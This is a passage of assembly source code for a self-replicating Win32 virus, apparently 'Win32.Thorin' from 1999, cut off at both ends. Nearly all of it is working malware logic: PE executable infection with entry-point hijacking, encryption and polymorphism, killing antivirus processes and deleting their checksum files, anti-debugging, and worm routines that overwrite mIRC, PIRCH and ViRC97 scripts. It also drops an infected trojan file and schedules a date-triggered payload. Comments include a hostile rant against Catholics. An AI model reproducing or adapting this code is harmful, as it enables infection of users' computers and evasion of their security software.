	mov     fs:[edx],esp
	dec     byte ptr [edx]
	jmp     over_rda

over_trap:
	call    delta                           ; Hardest code to undestand ;)
delta:  pop     ebp
	mov     eax,ebp
	sub     ebp,offset delta

	sub     eax,shit_b4_delta
	sub     eax,00001000h
NewEIP  equ     $-4

	push    eax                             ; Save it
	or      ebp,ebp                         ; Goddamn first gen...
	jz      over_rda
	call    rda_crypt
	jmp     over_rda

; ===========================================================================
; RDA Layer (Random Decryption Algorithm)
; ===========================================================================
; I have become a direct. I have become insurgent.

rda_crypt       proc
	xor     ebx,ebx                         ; Clear counter
try_another_key:
	call    crypt                           ; Try to decrypt it
	push    ebx                             ; Save counter
	lea     esi,[ebp+crypto]                ; Load address to crypt
	mov     edi,encrypt_size                ; Size to crypt
	call    CRC32                           ; Get its CRC32
	pop     ebx                             ; Restore counter
	cmp     eax,12345678h                   ; Actual CRC32=CRC32 unencrypted?
CRC     equ     $-4     
	jz      rda_done                        ; Yeah, then we decrypted it
	call    crypt                           ; Nopes, fix it
	inc     ebx                             ; increase key
	jmp     try_another_key                 ; Try with another key
rda_done:
	ret
rda_crypt       endp

crypt           proc                            ; This procedures simplifies
	lea     edi,[ebp+crypto]                ; the task (and optimizes) of
	mov     ecx,encrypt_size                ; encrypt with a determinated
rda_:   xor     byte ptr [edi],bl               ; key
	inc     edi
	loop    rda_
	ret
crypt           endp

; Legalizar consimizion, no te konviene... se akaba el filon!

; ===========================================================================
; CRC32 calculator [by Vecna]
; ===========================================================================
;
; input:
;        ESI = Offset where code to calculate begins
;        EDI = Size of that code
; output:
;        EAX = CRC32 of given code
;

CRC32           proc
	cld
	push    ebx
	xor     ecx,ecx                         ; Optimized by me - 2 bytes
	dec     ecx                             ; less
	mov     edx,ecx
NextByteCRC:
	xor     eax,eax
	xor     ebx,ebx
	lodsb
	xor     al,cl
	mov     cl,ch
	mov     ch,dl
	mov     dl,dh
	mov     dh,8
NextBitCRC:
	shr     bx,1
	rcr     ax,1
	jnc     NoCRC
	xor     ax,08320h
	xor     bx,0EDB8h
NoCRC:  dec     dh
	jnz     NextBitCRC
	xor     ecx,eax
	xor     edx,ebx
	dec     edi                             ; Another fool byte less
	jnz     NextByteCRC
	not     edx
	not     ecx
	pop     ebx
	mov     eax,edx
	rol     eax,16
	mov     ax,cx
	ret
CRC32           endp

crypto  equ     $

	db      " [IAIDA] "                    ; Little message to the pree-
						; tiest girl over the earth.
						; She deserves much more, i
						; know... anyway... she's here!

; No penseis ke soy baboso, ein?!?!?!?!?!? :)

over_rda:
	pop     eax
	mov     dword ptr [ebp+ModBase],eax     ; EAX = Image Base of module


	call    ChangeSEH                       ; SEH rlz.
	mov     esp,[esp+08h]                   ; Restore stack
	jmp     RestoreSEH
ChangeSEH:
	xor     ebx,ebx                         ; Joder, no joderemos...
	push    dword ptr fs:[ebx]              ; pero ­JODER! las ganas ke
	mov     fs:[ebx],esp                    ; tenemos :)

	and     byte ptr [ebp+inNT],00h         ; Make zero inNT variable

	mov     ecx,cs                          ; Check if we are under WinNT
	xor     cl,cl
	jecxz   WinNT                           ; ECX = 0 - WinNT;100 - Win9X
	jmp     shock

WinNT:
	inc     byte ptr [ebp+inNT]             ; If NT, mark this
shock:
	mov     esi,[esp+2Ch]                   ; Get program return address
	mov     ecx,05d                         ; Max level
	call    GetK32

; I hate the catholicism... I HATE THE CATHOLICISM!!!! STOP HIPOCRISY!!!!!!!!
; STOP THOSE GODDAMN LIES!!! What is that? God helps us? Hahahahah!!! So, you
; stupid catholic asshole... why  there are wars, genocides, etc? Why we, the
; human race, are as cruel with other humans, the nature, and everything that
; goes againist our own process to earn money? Open your eyes... i won't make
; you change using the power... just change yourself... it's your choice.

asakopako:
	mov     dword ptr [ebp+kernel],eax      ; EAX must be K32 base address

; This is the main branch of the virus

	lea     edi,[ebp+@@Offsetz]
	lea     esi,[ebp+@@Namez]
	call    GetAPIs                         ; Retrieve all APIs
	
	call    AntiDebugger                    ; Antidebug their arse

	call    PrepareInfection                ; Set-up infection

	call    KillMonitors                    ; Kill AV monitors
	
	call    InfectItAll                     ; Infect dirs
	
	call    DropPR0N                        ; Unpack and drop PR0N.EXE
	
	call    TraversalSearch                 ; Search for scripts and dr0p
	
	call    HookAllAPIs                     ; Hook IT APIs

; Ok, we prepare to end the adventure...

	push    WFD_HndSize                     ; Hook some mem for WFD_Handles
	push    00000000h                       ; structure
	apicall _GlobalAlloc
	mov     dword ptr [ebp+WFD_HndInMem],eax

; Activate payload every 26th of October, a magical day.

	lea     eax,[ebp+SYSTEMTIME]
	push    eax
	apicall _GetSystemTime

	cmp     word ptr [ebp+ST_wDay],31d
	jnz     continue_payload
	jmp     delete_key

continue_payload:
	cmp     word ptr [ebp+ST_wDay],26d
	jnz     no_payload

	cmp     word ptr [ebp+ST_wMonth],10d
	jnz     no_payload

	call    payload                         ; Well... payloads :)

no_payload:
	xchg    ebp,ecx                         ; 1st gen shit
	jecxz   fakehost_

RestoreSEH:
	xor     ebx,ebx                         ; Restore old SEH handler
	pop     dword ptr fs:[ebx]
	pop     eax

	popfd                                   ; Restore registers & flags
	popad

	mov     ebx,12345678h                   ; Here goes program's EIP
	org     $-4
OldEIP  dd      00001000h

	add     ebx,12345678h                   ; And here its base address
	org     $-4
ModBase dd      imagebase_

	push    ebx                             ; We return control to host
	ret

fakehost_:
	jmp     fakehost                        ; 1st gen shitz0r

; CATHOLICISM = FASCISM = SHIT

delete_key:                                     ; This gets executed once 
	lea     esi,[ebp+key_mIRC]              ; each 2 months :)
	call    DelReg
	lea     esi,[ebp+key_PIRCH]
	call    DelReg
	lea     esi,[ebp+key_ViRC97]
	call    DelReg
	jmp     no_payload

; ===========================================================================
; Most important virus info :)
; ===========================================================================

vname   label   byte
	db      "[Win32.Thorin."
	virussize
	db      " v1.00]",00h
copyr   db      "Copyright (c) 1999 by Billy Belcebu/iKX",0

; ===========================================================================
; Obtain useful info that will be used in infection process
; ===========================================================================

PrepareInfection:
	lea     edi,[ebp+WindowsDir]            ; Pointer to the variable
	push    7Fh                             ; Size of dir variable
	push    edi                             ; Push it!
	apicall _GetWindowsDirectoryA

	add     edi,7Fh                         ; Pointer to the variable
	push    7Fh                             ; Size of dir variable
	push    edi                             ; Push it!
	apicall _GetSystemDirectoryA

	add     edi,7Fh                         ; Pointer to the variable
	push    edi                             ; Size of dir variable
	push    7Fh                             ; Push it!
	apicall _GetCurrentDirectoryA

	lea     eax,[ebp+szUSER32]              ; Get all needed APIs from 
	push    eax                             ; the USER32.DLL library
	apicall _LoadLibraryA

	xchg    eax,ebx

	lea     edi,[ebp+@@USER32_APIs]         ; Pointer to API strings
	lea     esi,[ebp+@@USER32_Addresses]    ; Pointer to API addresses
retrieve_user32_apis:   
	push    edi                             ; Push pointer to string
	push    ebx                             ; Push USER32 base address
	apicall _GetProcAddress

	xchg    edi,esi                         ; Store the address
	stosd
	xchg    edi,esi

	xor     al,al                           ; Get the end of string
	scasb
	jnz     $-1

	cmp     byte ptr [edi],""              ; I like girls...
	jz      all_user32_apis                 ; Is last api?
	jmp     retrieve_user32_apis

all_user32_apis:
	lea     eax,[ebp+szADVAPI32]            ; Here we will get all needed
	push    eax                             ; APIs from ADVAPI32.DLL
	apicall _LoadLibraryA
	xchg    eax,ebx

	lea     edi,[ebp+@@ADVAPI32_APIs]       ; Pointer to API names
	lea     esi,[ebp+@@ADVAPI32_Addresses]  ; Pointer to API addresses
retrieve_advapi32_apis:
	push    edi                             ; Push pointer to name
	push    ebx                             ; Push ADVAPI32 base address
	apicall _GetProcAddress

	xchg    edi,esi                         ; Store API address
	stosd           
	xchg    edi,esi

	xor     al,al                           ; Get the end of API string
	scasb
	jnz     $-1

	cmp     byte ptr [edi],""              ; I like music [:)~
	jz      all_advapi32_apis
	jmp     retrieve_advapi32_apis

all_advapi32_apis:
	ret

; Heh, a greeting to the man (and the book!) that inspired this virus :)

	db      0,"[The Hobbit (c) 1937 by J.R.R. Tolkien]",0

; ===========================================================================
; Infect current, Windows and System directories
; ===========================================================================

InfectItAll:
	lea     edi,[ebp+directories]           ; Pointer to 1st directory
	mov     byte ptr [ebp+mirrormirror],dirs2inf ; Set up variable
requiem:
	push    edi                             ; Set as current dir the
	apicall _SetCurrentDirectoryA           ; dir to infect
	
	call    DeleteShit                      ; Delete AV CRC files

	push    edi

; Initialize this values for each directory processed

	and     byte ptr [ebp+CurrentExt],00h
	lea     esi,[ebp+EXTENSIONS]
	lea     edi,[ebp+EXTENSION]

infect_all_masks:
	cmp     byte ptr [ebp+CurrentExt],n_EXT
	jae     all_mask_infected

	lodsd                                   ; EAX = EXTENSION
	mov     [edi],eax                       ; No STOSD! We don't want EDI
						; to change...       

	push    edi esi
	call    Infect                          ; Infect some files
	pop     esi edi

	inc     byte ptr [ebp+CurrentExt]
	jmp     infect_all_masks
all_mask_infected:
	pop     edi

	add     edi,7Fh                         ; Get another directory

	dec     byte ptr [ebp+mirrormirror]     ; Check if we infected all
	cmp     byte ptr [ebp+mirrormirror],00h ; available directories
	jnz     requiem
	ret

; ===========================================================================
; Search MASK and infect found uninfected files
; ===========================================================================

Infect: and     dword ptr [ebp+infections],00000000h ; reset countah
	lea     eax,[ebp+offset WIN32_FIND_DATA] ; Find's shit
	push    eax

	lea     eax,[ebp+offset _MASK]
	push    eax

	apicall _FindFirstFileA                 ; Get first file on directory
	cmp_    eax,FailInfect                  ; Failed? Shit...
	mov     dword ptr [ebp+SearchHandle],eax

__1:    lea     edi,[ebp+WFD_szFileName]
	call    AvoidShitFiles
	jc      __2

	push    dword ptr [ebp+NewEIP]
	push    dword ptr [ebp+OldEIP]
	push    dword ptr [ebp+ModBase]
	call    Infection                       ; Infect file
	pop     dword ptr [ebp+ModBase]
	pop     dword ptr [ebp+OldEIP]
	pop     dword ptr [ebp+NewEIP]
	jc      __2

	inc     byte ptr [ebp+infections]
	cmp     byte ptr [ebp+infections],n_infections ; Did we infected them?
	jae     FailInfect                      ; Yeah... :)

__2:    lea     edi,[ebp+WFD_szFileName]        ; Clear name field
	mov     ecx,MAX_PATH
	xor     al,al
	rep     stosb

	lea     eax,[ebp+offset WIN32_FIND_DATA] ; Search for another file
	push    eax
	push    dword ptr [ebp+SearchHandle]
	apicall _FindNextFileA
	cmpz    eax,CloseSearchHandle
	jmp     __1

CloseSearchHandle:
	push    dword ptr [ebp+SearchHandle] ; Close search handle
	apicall _FindClose
FailInfect:
	ret

	db      0,"[Luthien is still alive in the world]",0

; ===========================================================================
; Traversal search for mIRC and PIRCH scripts (modified version of LJ's code)
; ===========================================================================

TraversalSearch:
	lea     esi,[ebp+tempcurdir]            ; Get the current directory
	push    esi                             ; (We only want the current
	push    7Fh                             ; drive)
	apicall _GetCurrentDirectoryA

	lodsb                                   ; Get drive

	mov     byte ptr [ebp+root],al          ; Put it in its variable

	lea     eax,[ebp+root]                  ; Reach the root directory
	push    eax                             ; of the current drive
	apicall _SetCurrentDirectoryA

Traversal:
	lea     esi,[ebp+key_mIRC]              ; Already catched? Avoid 
	call    RegExist                        ; this if so, as it needs many
	jc      nomoretosearch                  ; time, and the user could
	lea     esi,[ebp+key_PIRCH]             ; notice our presence :)
	call    RegExist
	jc      nomoretosearch
	lea     esi,[ebp+key_ViRC97]
	call    RegExist
	jc      nomoretosearch
	xor     ebx,ebx                         ; Clear counter

findfirstdir:
	lea     edi,[ebp+_WIN32_FIND_DATA]      ; Search for directories
	push    edi
	lea     eax,[ebp+ALL_MASK]
	push    eax
	apicall _FindFirstFileA
	cmp_    eax,notfoundfirstdir

	mov     dword ptr [ebp+TSHandle],eax

main_trav:
	cmp     dword ptr [ebp+_WFD_dwFileAttributes],directory_attr
	jnz     findnextdir

	lea     eax,[ebp+_WFD_szFileName]       
	cmp     byte ptr [eax],"."              ; Is dir "." or ".."? 
	jz      findnextdir                     ; Shitz

	push    eax
	apicall _SetCurrentDirectoryA

	pushad
	call    Worms                           ; Let's rock!
	popad

	push    dword ptr [ebp+TSHandle]        ; Save handle
	inc     ebx                             ; Increase counter :)
	jmp     findfirstdir
findnextdir:
	push    edi                             ; Search for another dir
	push    dword ptr [ebp+TSHandle]
	apicall _FindNextFileA
	cmpz    eax,notfoundfirstdir

	jmp     main_trav
notfoundfirstdir:
	lea     eax,[ebp+dotdot]                ; Go back 1 dir
	push    eax
	apicall _SetCurrentDirectoryA

	or      ebx,ebx                         ; Are we in root? yeah, it's
	jz      nomoretosearch                  ; over! our search finished! 

	dec     ebx                             ; Decrease countah
	pop     dword ptr [ebp+TSHandle]
	jmp     findnextdir

notfoundnextdir:
	push    dword ptr [ebp+TSHandle]
	apicall _FindClose
	jmp     notfoundfirstdir

nomoretosearch:
	lea     esi,[ebp+key_PIRCH]             ; Mark all registry keys...
	call    PutReg
	lea     esi,[ebp+key_mIRC]
	call    PutReg
	lea     esi,[ebp+key_ViRC97]
	call    PutReg

	lea     esi,[ebp+tempcurdir]            ; And put current directory
	push    esi                             ; back :)
	apicall _SetCurrentDirectoryA
	ret

	db      0,"[Thorin,Dori,Nori,Ori,Balin,Dwalin,Fili,Kili,Oin,Gloin,"
	db      "Bifur,Bofur,Bombur]",0

; ===========================================================================
; Worms (mIRC & PIRCH) installer
; ===========================================================================

Worms:
	call    DeleteShit                      ; Delete AV CRCs from all dir
	push    80h                             ; We test for the presence of
	lea     eax,[ebp+PirchWormFile]         ; the scripts by setting a
	push    eax                             ; normal attribute to them.
	apicall _SetFileAttributesA             ; If the api returns us an
	xchg    eax,ecx                         ; error, then we know the
	jecxz   TryWithMIRC                     ; file doesn't exist :)
	jmp     BorrowPIRCH                     ; As in DOS! ;)
TryWithMIRC:
	push    80h
	lea     eax,[ebp+mIRCWormFile]
	push    eax
	apicall _SetFileAttributesA
	xchg    eax,ecx
	jecxz   TryWithViRC97
	jmp     BorrowMIRC
TryWithViRC97:
	push    80h
	lea     eax,[ebp+ViRC97WormFile]
	push    eax
	apicall _SetFileAttributesA
	xchg    eax,ecx
	jecxz   ExitWorms
	jmp     BorrowViRC97       
ExitWorms:
	ret

; ===========================================================================
; PIRCH script overwrite
; ===========================================================================

BorrowPIRCH:                                    ; If file found, drop the
	xor     eax,eax                         ; new script file
	push    eax
	push    eax
	push    00000003h
	push    eax
	inc     eax
	push    eax
	push    40000000h
	call    _PIRCH

PirchWormFile db "events.ini",0                 ; What to overwrite

_PIRCH: apicall _CreateFileA

	mov     dword ptr [ebp+TempHandle],eax

	push    00000000h                       ; Overwrite with our script :)
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    PirchWormSize
	lea     ebx,[ebp+PirchWorm]
	push    ebx
	push    eax
	apicall _WriteFile

	mov     ecx,PirchWormSize               ; And trunc the file, so there
	call    TruncFile                       ; won't be more shit ;)

	push    dword ptr [ebp+TempHandle]
	apicall _CloseHandle
	ret

; ===========================================================================
; mIRC script overwrite
; ===========================================================================

BorrowMIRC:                                     ; Same as above, but with
	xor     eax,eax                         ; mIRC scripts
	push    eax
	push    eax
	push    00000003h
	push    eax
	inc     eax
	push    eax
	push    40000000h
	call    _mIRC

mIRCWormFile db "mirc.ini",0

_mIRC:  apicall _CreateFileA

	mov     dword ptr [ebp+TempHandle],eax

	push    00000000h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    mIRCWormSize
	lea     ebx,[ebp+mIRCWorm]
	push    ebx
	push    eax
	apicall _WriteFile

	mov     ecx,mIRCWormSize
	call    TruncFile

	push    dword ptr [ebp+TempHandle]
	apicall _CloseHandle
	ret

; ===========================================================================
; ViRC97 script overwrite
; ===========================================================================

BorrowViRC97:                                   ; Same as above, but with
	xor     eax,eax                         ; ViRC97 scripts
	push    eax
	push    eax
	push    00000003h
	push    eax
	inc     eax
	push    eax
	push    40000000h
	call    _ViRC97

ViRC97WormFile db "default.lib",0

_ViRC97:apicall _CreateFileA

	mov     dword ptr [ebp+TempHandle],eax

	push    00000000h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    ViRC97WormSize
	lea     ebx,[ebp+ViRC97Worm]
	push    ebx
	push    eax
	apicall _WriteFile

	mov     ecx,ViRC97WormSize
	call    TruncFile

	push    dword ptr [ebp+TempHandle]
	apicall _CloseHandle
	ret

; ===========================================================================
; Unpack, drop and infect our PE file [TROJAN mode]
; ===========================================================================

DropPR0N:
	push    drop_old_size                   ; Allocate some memory
	push    00000000h
	apicall _GlobalAlloc
	cmpz    eax,_ExitDropPR0N
	mov     dword ptr [ebp+GlobalAllocHnd],ecx

	mov     edi,dropper_size                ; Unpack in allocated memory
	xchg    edi,ecx                         ; the dropper
	lea     esi,[ebp+dropper]
	call    LSCE_UnPack

	push    00000000h                       ; Create the dropper on
	push    00000080h                       ; C:\PR0N.EXE (hi darkman!) ;)
	push    00000002h
	push    00000000h
	push    00000001h
	push    40000000h
	call    _PR0N

pr0nfile db      "C:\PR0N.EXE",0

_ExitDropPR0N:
	jmp ExitDropPR0N

_PR0N:  apicall _CreateFileA

	push    eax                             ; Write it, sucka!
	push    00000000h
	lea     ebx,[ebp+iobytes]
	push    ebx
	push    drop_old_size
	push    dword ptr [ebp+GlobalAllocHnd]
	push    eax
	apicall _WriteFile
	apicall _CloseHandle

	lea     edi,[ebp+pr0nfile]              ; Infect it
	call    _Infection

	push    dword ptr [ebp+GlobalAllocHnd]  ; And free allocated memory
	apicall _GlobalFree
ExitDropPR0N:
	ret

; ===========================================================================
; Self protect virus againist debuggers
; ===========================================================================

AntiDebugger:
	apicall _GetVersion                     ; Check for Win95, as it dont
	cmp     eax,80000000h                   ; have the IsDebuggerPresent
	jb      BetterNot                       ; API.

	cmp     ax,0A04h
	jb      BetterNot

	lea     esi,[ebp+@IsDebuggerPresent]
	call    GetAPI_ET
	call    eax                             ; Are we being debugged? Shit!
	cmpz    eax,BetterNot

	cli                                     ; Who said that Windoze don't
	jmp     $-1                             ; use interrupts? ;) Int8 rlz

BetterNot:
	ret

	db      0,"[Dedicated to all Tolkien fans over the middle-earth]",0

; ===========================================================================
; Kill AV CRC files
; ===========================================================================

DeleteShit:
	pushad
	lea     edi,[ebp+@@BadPhilez]           ; Load pointer to first file
	mov     ecx,bad_number                  ; Number of files to erase

killem: push    ecx                             ; Save the number
	push    edi                             ; Push file to erase
	apicall _DeleteFileA                    ; Delete it!
	pop     ecx                             ; Restore the number
	xor     al,al                           ; Get the next file
	scasb
	jnz     $-1
	loop    killem                          ; Loop and delete another :)
	popad
	ret

; ===========================================================================
; Kill the processes of determinated AV monitors
; ===========================================================================

KillMonitors:
	lea     edi,[ebp+Monitors2Kill]
KM_L00p:
	call    TerminateProc
	xor     al,al                           ; Reach the end of string
	scasb
	jnz     $-1
	cmp     byte ptr [edi],0BBh             ; Last item of array?
	jnz     KM_L00p
	ret

; ===========================================================================
; Avoid infection of certain files
; ===========================================================================
;
; input:
;       EDI = Pointer to file name
; output:
;       CF  = Set to 1 if it exist, to 0 if it doesn't
;

AvoidShitFiles:
	lea     esi,[ebp+@@BadProgramz]         ; Ptr to table
ASF_Loop:
	xor     eax,eax                         ; Clear EAX
	lodsb                                   ; Load size of string in AL
	cmp     al,0BBh                         ; End of table?
	jz      AllShitFilesProcessed           ; Oh, shit!
	xchg    eax,ecx                         ; Put Size in ECX
	push    edi                             ; Preserve program pointer
	rep     cmpsb                           ; Compare both strings
	pop     edi                             ; Restore program pointer
	jz      ShitFileFound                   ; Damn, a shitty file!
	add     esi,ecx                         ; Pointer to another string
	jmp     ASF_Loop                        ; in table & loop
AllShitFilesProcessed:
	mov     cl,00h                          ; Overlap, so CL = 0F9h
	org     $-1
ShitFileFound:
	stc                                     ; Set carry
	ret

; ===========================================================================
; PE Infection (with parameters)
; ===========================================================================
;
; input:
;        EDI = Pointer to file name
; output:
;        Nothing.
;

_Infection:
	push    edi
	apicall _GetFileAttributesA
	cmp_    eax,_ExitInfection
	mov     dword ptr [ebp+WFD_dwFileAttributes],eax       

	mov     esi,edi
	call    OpenFile
	cmp_    eax,_ExitInfection

	push    eax

	push    00000000h
	push    eax
	apicall _GetFileSize
	mov     dword ptr [ebp+WFD_nFileSizeLow],eax

	apicall _CloseHandle

	lea     esi,[ebp+WFD_szFileName]
	xchg    esi,edi
duhast: lodsb
	or      al,al
	jz      engel
	stosb
	jmp     duhast
engel:  stosb
	push    dword ptr [ebp+NewEIP]
	push    dword ptr [ebp+OldEIP]
	push    dword ptr [ebp+ModBase]
	call    Infection
	pop     dword ptr [ebp+ModBase]
	pop     dword ptr [ebp+OldEIP]
	pop     dword ptr [ebp+NewEIP]

	mov     cl,00h                          ; Overlapppppp
	org     $-1
_ExitInfection:
	stc
	ret

; ===========================================================================
; PE Infection (with WIN32_FIND_DATA)
; ===========================================================================
;
; input:
;        Nothing (everything needed is in WFD structure).
; output:
;        Nothing.
;

Infection:
	lea     esi,[ebp+WFD_szFileName]        ; Get FileName to infect
	push    80h
	push    esi
	apicall _SetFileAttributesA             ; Wipe its attributes

	call    OpenFile                        ; Open it

	cmp_    eax,CantOpen
	mov     dword ptr [ebp+FileHandle],eax

	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] ; 1st we create map with
	call    CreateMap                       ; its exact size
	cmpz_   eax,CloseFile

	mov     dword ptr [ebp+MapHandle],eax

	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow]
	call    MapFile                         ; Map it
	cmpz_   eax,UnMapFile

	mov     dword ptr [ebp+MapAddress],eax

	mov     esi,eax                         ; Get PE Header
	mov     esi,[esi+3Ch]
	add     esi,eax
	cmp     dword ptr [esi],"EP"            ; Is it PE?
	jnz     NoInfect

	cmp     dword ptr [esi+mark],ddInfMark  ; Was it infected?
	jz      NoInfect
       
	push    dword ptr [ebp+MapAddress]
	apicall _UnmapViewOfFile

	push    dword ptr [ebp+MapHandle]
	apicall _CloseHandle

	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] ; And Map all again.
	add     ecx,virus_size
	call    CreateMap
	cmpz_   eax,CloseFile

	mov     dword ptr [ebp+MapHandle],eax

	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow]
	add     ecx,virus_size
	call    MapFile
	cmpz_   eax,UnMapFile
	mov     dword ptr [ebp+MapAddress],eax

	mov     esi,eax
	mov     esi,[eax+3Ch]
	add     esi,eax

	call    GetLastSection                  ; ESI = Last Section
						; EDI = PE header

	mov     eax,[edi+28h]                   ; Save original EIP
	mov     dword ptr [ebp+OldEIP],eax
	
	mov     edx,[esi+10h]
	mov     ebx,edx
	add     edx,[esi+14h]                   ; EDX = Phisical address where
						; append virus

	push    edx

	mov     eax,ebx
	add     eax,[esi+0Ch]                   ; EAX = VA of new EIP
	mov     [edi+28h],eax                   ; Set the new entrypoint
	mov     dword ptr [ebp+NewEIP],eax

	mov     eax,[esi+10h]                   ; Retrieve new SizeOfRawData
	add     eax,virus_size                  ; and VirtualSize
	mov     ecx,[edi+3Ch]
	call    Align

	mov     [esi+10h],eax                   ; Set new SizeOfRawData
	mov     [esi+08h],eax                   ; Set new VirtualSize

	pop     edx

	mov     eax,[esi+10h]                   ; Set new SizeOfImage
	add     eax,[esi+0Ch]
	mov     [edi+50h],eax

	and     dword ptr [edi+0A0h],00h        ; Nulify the relocs, so they
	and     dword ptr [edi+0A4h],00h        ; won't fuck us :)

	or      dword ptr [esi+24h],section_flags ; Set new section attributes

	mov     dword ptr [edi+mark],ddInfMark  ; Mark infected files

	push    dword ptr [ebp+WFD_nFileSizeLow]
	pop     dword ptr [edi+orig_size]       ; Store orig. size for stealth

	push    dword ptr [edi+3Ch]
	push    dword ptr [ebp+infections]
	and     dword ptr [ebp+infections],00h

; Some RDA stuff

	push    edi esi edx                     ; Save ESI and EDI for later
	lea     esi,[ebp+crypto]
	mov     edi,encrypt_size
	call    CRC32                           ; Obtain virus CRC32
	pop     edx esi edi
	mov     dword ptr [ebp+CRC],eax         ; Store it

	push    edx
	apicall _GetTickCount                   ; Get a random number as seed
	xchg    ebx,eax                         ; for RDA encryption
	pop     edx

; Append virus & RDA encryption
	
	mov     edi,dword ptr [ebp+MapAddress]  ; Write non crypted part
	add     edi,edx
	push    edi
	lea     esi,[ebp+virus_start]
	mov     ecx,non_crypt_size
	cld
	rep     movsb

	mov     ecx,encrypt_size                ; Encrypt and copy the rest
cryptl: lodsb
	xor     al,bl
	stosb
	loop    cryptl
	pop     edi

; Poly decryptor generation

	lea     eax,[ebp+random_seed]           ; Get a slow seed for poly
	push    eax
	apicall _GetSystemTime

	mov     eax,poly_virus_size             ; Obtain exactly a reliable
	mov     ecx,4                           ; value of virus_size divided
	call    Align                           ; by 4
	shr     eax,2
	xchg    eax,ecx

	mov     esi,edi
	add     esi,LIMIT
	call    THME                            ; generate the poly decryptor

	pop     dword ptr [ebp+infections]

	mov     eax,edi                         ; Trunc file
	sub     eax,dword ptr [ebp+MapAddress]
	pop     ecx
	call    Align
	xchg    eax,ecx
	call    TruncFile

	jmp     UnMapFile
NoInfect:
	stc
	dec     byte ptr [ebp+infections]       ; Shit, if we are here, 
	mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] ; something failed :(
	call    TruncFile

UnMapFile:
	push    dword ptr [ebp+MapAddress]      ; Close map view of file
	apicall _UnmapViewOfFile

CloseMap:
	push    dword ptr [ebp+MapHandle]       ; Close map handle
	apicall _CloseHandle

CloseFile:
	push    dword ptr [ebp+FileHandle]      ; Close file handle
	apicall _CloseHandle

CantOpen:
	push    dword ptr [ebp+WFD_dwFileAttributes]
	lea     eax,[ebp+WFD_szFileName]        ; Restore old attributes
	push    eax
	apicall _SetFileAttributesA
	ret

	db      0,"[Welcome to the Middle-Earth, my dear friend]",0

; ===========================================================================
; Tiny method for get KERNEL32 base address
; ===========================================================================
;
; input:
;        ESI = Program return address
;        ECX = Limit of pages where search
; output:
;        EAX = Base address of KERNEL32.dll
;

GetK32          proc                            ; My own little GetK32 :)
	and     esi,0FFFF0000h
_@1:    jecxz   WeFailed                        ; Thanx to Super for the idea
	cmp     word ptr [esi],"ZM"             ; and Qozah for notifying me
	jz      CheckPE                         ; a little error (Thnx man!)
_@2:    sub     esi,10000h
	dec     ecx
	jmp     _@1

CheckPE:
	mov     edi,[esi+3Ch]
	add     edi,esi
	cmp     dword ptr [edi],"EP"
	jz      WeGotK32
	jmp     _@2
WeFailed:
	cmp     byte ptr [ebp+inNT],00h         ; Otherwise, hardcode to the
	jz      W9X                             ; proper OS.
	mov     esi,kernel_wNT                  ; NT = 77F00000h
	jmp     WeGotK32
W9X:    mov     esi,kernel_                     ; 9X = BFF70000h
WeGotK32:
	xchg    eax,esi
	ret
GetK32          endp

; ===========================================================================
; Retrieve API addresses (from Export Table)
; ===========================================================================
;
; input:
;        EDI = Pointer to where you want the first API Address
;        ESI = Pointer to the first API Name
; output:
;        Nothing.
;

GetAPIs         proc
@@1:    push    esi
	push    edi
	call    GetAPI_ET
	pop     edi
	pop     esi

	stosd

	xchg    edi,esi

	xor     al,al
@@2:    scasb
	jnz     @@2

	xchg    edi,esi

@@3:    cmp     byte ptr [esi],0BBh
	jz      @@4
	jmp     @@1
@@4:    ret
GetAPIs         endp

; ===========================================================================
; Retrieve API address (from Export Table)
; ===========================================================================
;
; input:
;        ESI = Pointer to API Name
; output:
;        EAX = API address
;

GetAPI_ET       proc
	mov     edx,esi
	mov     edi,esi

	xor     al,al
@_1:    scasb
	jnz     @_1

	sub     edi,esi                         ; EDI = API Name size
	mov     ecx,edi

	xor     eax,eax
	mov     esi,3Ch
	rva2va  esi,kernel

	lodsw
	rva2va  eax,kernel

	mov     esi,[eax+78h]
	add     esi,1Ch
	rva2va  esi,kernel

	lodsd
	rva2va  eax,kernel
	mov     dword ptr [ebp+AddressTableVA],eax
	lodsd

	rva2va  eax,kernel
	push    eax                             ; mov [NameTableVA],eax   =)
	lodsd

	rva2va  eax,kernel

	mov     dword ptr [ebp+OrdinalTableVA],eax
	pop     esi

        xor     ebx,ebx

@_3:    push    esi
	lodsd

	rva2va  eax,kernel
	mov     esi,eax
	mov     edi,edx

	push    ecx
	cld
	rep     cmpsb
	pop     ecx
	jz      @_4
	pop     esi
	add     esi,4
        inc     ebx
	jmp     @_3

@_4:
	pop     esi
        xchg    eax,ebx
	shl     eax,1
	add     eax,dword ptr [ebp+OrdinalTableVA]
	xor     esi,esi
	xchg    eax,esi
	lodsw
	shl     eax,2
	add     eax,dword ptr [ebp+AddressTableVA]
	xchg    esi,eax
	lodsd
	rva2va  eax,kernel
	ret
GetAPI_ET       endp

; ===========================================================================
; Retrieve API address (from Import Table)
; ===========================================================================
;
; input:
;        EDI = Offset of API address to retrieve
; output:
;        EAX = Address of the API
;        EBX = Address of the API address in the import
;

GetAPI_IT       proc
	mov     dword ptr [ebp+TempGA_IT1],edi
	mov     ebx,edi
	xor     al,al
	scasb
	jnz     $-1
	sub     edi,ebx

	mov     dword ptr [ebp+TempGA_IT2],edi

	xor     eax,eax
	mov     esi,dword ptr [ebp+imagebase]
	add     esi,3Ch
	lodsw
	add     eax,dword ptr [ebp+imagebase]
	xchg    esi,eax
	lodsd

	cmp     eax,"EP"
	jnz     nopes

	add     esi,7Ch
	lodsd
	push    eax
	lodsd
	mov     ecx,eax
	pop     esi
	add     esi,dword ptr [ebp+imagebase]
	
SearchK32:
	push    esi
	mov     esi,[esi+0Ch]
	add     esi,dword ptr [ebp+imagebase]
	lea     edi,[ebp+K32_DLL]
	mov     ecx,K32_Size
	cld
	push    ecx
	rep     cmpsb
	pop     ecx
	pop     esi
	jz      gotcha
	add     esi,14h
	jmp     SearchK32
gotcha:
	cmp     byte ptr [esi],00h
	jz      nopes
	mov     edx,[esi+10h]
	add     edx,dword ptr [ebp+imagebase]
	lodsd
	jz      nopes

	xchg    edx,eax
	add     edx,[ebp+imagebase]
	xor     ebx,ebx
loopy:
